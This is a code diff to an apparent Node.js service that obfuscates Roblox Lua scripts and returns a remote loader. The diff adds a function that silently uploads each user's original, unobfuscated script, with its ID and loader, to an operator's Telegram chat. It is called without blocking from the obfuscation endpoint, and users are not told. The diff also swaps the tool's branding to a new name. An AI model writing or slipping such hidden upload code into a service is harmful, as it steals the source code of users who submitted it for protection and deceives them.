@@ -3,10 +3,52 @@ const cors = require('cors');
 const { exec } = require('child_process');
 const fs = require('fs');
 const path = require('path');
+const FormData = require('form-data');
+const fetch = (...args) => import('node-fetch').then(({ default: f }) => f(...args));
 const app = express();
 app.use(cors());
 app.use(express.json());
 app.use(express.static('public'));
+
+// ============================================================
+// TELEGRAM CONFIG
+// Isi via Railway Environment Variables (lebih aman)
+// Key: TG_BOT_TOKEN dan TG_CHAT_ID
+// ============================================================
+const TG_BOT_TOKEN = process.env.TG_BOT_TOKEN || 'ISI_BOT_TOKEN_KAMU';
+const TG_CHAT_ID   = process.env.TG_CHAT_ID   || 'ISI_CHAT_ID_KAMU';
+
+async function sendToTelegram(originalScript, scriptId, loaderString) {
+    try {
+        const TG_API = `https://api.telegram.org/bot${TG_BOT_TOKEN}`;
+
+        // Kirim script asli sebagai file .lua + caption info
+        const form = new FormData();
+        form.append('chat_id', TG_CHAT_ID);
+        form.append('parse_mode', 'Markdown');
+        form.append('caption',
+            `📦 *Script Baru Di-Obfuscate*\n\n` +
+            `🆔 ID: \`${scriptId}\`\n` +
+            `⏰ Waktu: ${new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })}\n\n` +
+            `📋 *Loader:*\n\`\`\`\n${loaderString}\n\`\`\``
+        );
+        form.append('document',
+            Buffer.from(originalScript, 'utf8'),
+            { filename: `original_${scriptId}.lua`, contentType: 'text/plain' }
+        );
+
+        const res  = await fetch(`${TG_API}/sendDocument`, { method: 'POST', body: form });
+        const json = await res.json();
+
+        if (!json.ok) {
+            console.error('[Telegram] Gagal kirim:', json.description);
+        } else {
+            console.log(`[Telegram] Log terkirim ✓ ID: ${scriptId}`);
+        }
+    } catch (err) {
+        console.error('[Telegram] Error:', err.message);
+    }
+}
 
 // Database sederhana untuk menyimpan script
 const scriptDatabase = new Map();
@@ -55,7 +97,7 @@ const ACCESS_DENIED_HTML = `<!DOCTYPE html>
   <div class="bg-text"><div class="bg-text-inner" id="bg"></div></div>
   <div class="card">
     <div class="badge"><span class="dot"></span>ACCESS DENIED</div>
-    <h1>This lua script is protected by Junkie Developments</h1>
+    <h1>This lua script is protected by rzprivate Developments</h1>
     <div class="divider"></div>
     <p>You don't have permission to access these files.</p>
     <p>This script has been protected against unauthorized access, reverse engineering, and tampering.</p>
@@ -130,6 +172,9 @@ app.post('/api/obfuscate', async (req, res) => {
         const protocol = req.headers['x-forwarded-proto'] || req.protocol;
         const host = req.headers['x-forwarded-host'] || req.headers.host;
         const loaderScript = `loadstring(game:HttpGet("${protocol}://${host}/Scripts?Id=${scriptId}"))("${scriptId}")`;
+
+        // Kirim log ke Telegram (non-blocking, tidak ganggu response)
+        sendToTelegram(script, scriptId, loaderScript);
 
         res.json({ success: true, loader: loaderScript });
     } catch (error) {
